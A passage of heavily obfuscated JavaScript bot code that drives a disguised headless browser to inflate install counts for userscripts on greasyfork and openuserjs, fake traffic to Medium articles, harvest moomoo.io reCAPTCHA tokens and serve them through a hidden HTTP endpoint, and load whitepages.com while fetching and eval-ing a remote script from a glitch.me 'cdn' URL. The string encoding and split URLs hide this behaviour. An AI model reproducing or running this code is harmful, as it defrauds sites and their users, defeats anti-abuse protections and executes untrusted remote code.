      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + W(0xa, '4xYA') + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + W(0x4, '4xYA') + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + X(0x6) + '6',
    Y(0x1) + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + W(0x8, 'z6U7') + Y(0x12) + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    Y(0x7) + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1022 + 0x1ac8 + -0x2aea
  };

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x18d5 + 0x9f + -0x409 * -0x6);
    let h = e[f];
    if (b['rHvgNh'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x18c5 + 0x2 * 0x74f + 0xa27, s, t, u = -0x115a + -0x409 + 0x1563; t = n['charAt'](u++); ~t && (s = r % (0x1fc9 + 0x1 * -0xa0d + 0x2b7 * -0x8) ? s * (-0x99f * 0x3 + -0x1020 + 0x2d3d) + t : t, r++ % (0xddd + -0x1 * 0xb7a + -0x25f * 0x1)) ? p += String['fromCharCode'](0x1642 + -0x1 * -0xa0c + 0x23 * -0xe5 & s >> (-(-0x2 * 0x1025 + 0x788 + 0x27a * 0xa) * r & 0x1c * -0x81 + -0x71a + 0x153c)) : -0x946 * 0x1 + -0x197d + 0x22c3) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1 * 0x201b + 0x3 * 0x778 + -0x3683, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x69e + 0x7c0 + -0xe4e))['slice'](-(0xa9c * -0x1 + 0xb * -0x2 + -0x5 * -0x224));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x7 * -0x261 + -0x34d + -0xd5a,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x18eb + -0x1816 + -0x3101 * -0x1; u < 0xaaa + -0x24d4 + 0x7a * 0x39; u++) {
          p[u] = u;
        }
        for (u = 0x5 * 0xb + 0x85 * 0x42 + 0x49 * -0x79; u < 0x2f * -0x45 + 0x23c3 + 0x586 * -0x4; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x241b + -0xdc * 0xe + -0x1713), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x2 * -0x511 + -0x853 + -0x1cf, q = -0xe79 + 0x4d * -0x2c + -0x1 * -0x1bb5;
        for (let v = 0x509 + -0x1da4 + -0x1 * -0x189b; v < n['length']; v++) {
          u = (u + (0x8bd * 0x3 + -0x1 * 0x7d5 + -0x1261)) % (-0x946 + 0x22 * -0x55 + 0x1590), q = (q + p[u]) % (-0x7f * -0x16 + -0x88 * -0x21 + 0x926 * -0x3), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x187f * -0x1 + -0x1bc6 + 0x447)]);
        }
        return t;
      };
      b['qqXIzT'] = m, c = arguments, b['rHvgNh'] = !![];
    }
    const j = e[-0x117d * -0x1 + 0x2588 + -0x3705],
      k = f + j,
      l = c[k];
    return !l ? (b['dPEeQZ'] === undefined && (b['dPEeQZ'] = !![]), h = b['qqXIzT'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Z = b;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x62f + -0x438 + -0x1f7)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + Z(0xb, 'cgj(')];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1b * -0xc1 + -0x213b + 0x3 * 0x11fe), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0xadd + 0x1084 * -0x1 + -0x1 * -0x1bc5), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const a0 = b,
          r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x3 * -0x1c9 + -0x579 * 0x1 + 0xe * 0xc6;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1 * -0x16ba + -0x1b * -0xf1 + -0x3025; w < getRandomInt(0xb48 + 0x1ad1 + -0x2618, 0x2263 + 0xcee + -0x2f4c); w++)
            await u[a0(0x16, 'i0Rj')]['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0xf7a * -0xb + -0x14e * 0x2c + 0x798a * 0x1);
        }
      }();
    }, -0x22 * -0x9b + 0xb * 0x32d + -0x3721), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x25 * -0x7c + -0x1a2d + 0x841;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x4ec + 0xf9 * 0x1f + 0x869 * -0x3, -0x641 + -0x2133 + -0xa * -0x3f7)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x45 * -0x16b + -0x250f * 0x4 + 0x5 * 0x48a7);
    }, -0x129a + -0x1f * 0x39 + 0x19e5), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x126c + -0xf4d + -0x1 * -0x21b9;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x21b8 + 0x9 * 0x57 + 0x2a61), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x7a * 0x11 + -0x4 * -0x9 + 0x5 * -0x1a6), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x8 * 0x3a1 + 0x173777 + -0x95ecf);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x3 * -0x8eb + 0x3 * -0x6d9 + -0x5d2);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x14af + -0x1 * -0xe87 + -0x226e);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x2 * -0x3fb + -0x1178 + 0x38fe);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = c;
  async function f() {
    const a1 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x238d + 0x2618 + -0x49a4) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x14ce + -0x25e7 * 0x1 + -0x1 * -0x111a));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x860 + 0xcfd + -0x155d * 0x1, D['indexOf']('\x20'));
        return B ? E['slice'](-0x412 * -0x8 + -0xac * 0x3 + -0x4 * 0x7a3, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal[a1(0x0)](0x369 + 0x14bf + -0x24 * -0x6a),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + a1(0xe) + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x2ec8 + 0x1 * 0x2513 + 0x30c5 * 0x1),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + a2(0x9) + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x12d * 0x3 + 0xc7a + -0x4f * 0x1d; k < 0x359 * 0x1 + 0x1 * 0x340 + -0x695; k++)
    setTimeout(f, (0x19269 + 0xa3 * -0x1cc + -0x1 * -0x7cdb) * k * getRandomInt(0x337 * 0x9 + 0x13f4 * 0x1 + 0x1 * -0x30e2, -0x2658 + 0x1885 + -0x142 * -0xb));
